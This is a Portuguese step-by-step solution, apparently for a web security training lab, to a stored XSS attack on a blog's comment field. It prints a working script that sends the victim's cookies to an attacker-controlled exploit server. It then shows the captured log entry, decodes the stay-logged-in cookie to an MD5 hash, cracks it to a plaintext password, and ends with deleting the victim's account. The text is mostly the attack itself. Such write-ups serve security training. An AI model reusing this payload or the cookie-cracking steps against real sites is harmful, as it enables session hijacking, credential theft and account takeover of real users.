/*
RESOLUÇÃO:

1º passo - Logar na conta com as credenciais próprias (wiener:peter)

2º passo - Acessar algum post do site e injetar XSS no campo de comentário (vulneráveis a XSS)
    Código JS malicioso */
    <script>
    url_exploit_server = 'https://exploit-0a2a007704c235438081026c012700d2.exploit-server.net/exploit'
    document.location=url_exploit_server+document.cookie
    </script>
    //url_exploit_server -> variável armazena a url do servidor do atacante
    //document.location -> redireciona o navegador da vítima para o servidor do atacante
    //document.cookie -> captura todos os cookies da página atual e concatena a url

    /* Quando a vítima acessar o post do site contendo o código JS malicioso, 
    o script será executado em seu navegador e forçará um redirecionamento para um servidor controlado pelo atacante.
    Durante essa requisição, os cookies da vítima serão incluídos na URL e serão registrados nos logs do servidor.


3º passo - Acessar o servidor controlado pelo atacante e analisar os logs de acesso

   10.0.4.53       2026-04-12 04:05:59 +0000 
   "GET /exploitsecret=TnIu9YdwcwhIcZWJ9rx7NNPfEdk751Yq;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1"
   404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

    Análise do log:
    10.0.4.53 -> Endereço IP da vítima
    2026-04-12 03:45:15 +0000 -> Data e horário em que o servidor recebeu a requisição
    GET -> Método usado pelo navegador
    /exploitsecret=Tn...;%20stay-logged-in=Y2... -> caminho acessado
    %20 -> codificação de espaço 
    secret e stay-logged-in -> cookies da vítima concatenados no caminho acessado
    HTTP/1.1 -> versão do protocolo
    404 -> Código de resposta do servidor (rota não encontrada)
    user-agent: Mozilla/5.0 (Victim)... -> navegador da vítima que fez a requisição 


4º passo - Decodificar o token stay-logged-in e descobrir a senha do usuário

    base64_decode(Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz) = carlos:26323c16d5f4dabff3bb136f2460a943
    md5_decode(26323c16d5f4dabff3bb136f2460a943) = onceuponatime
    carlos:onceuponatime


5º passo    
   Logar e excluir conta da vítima*/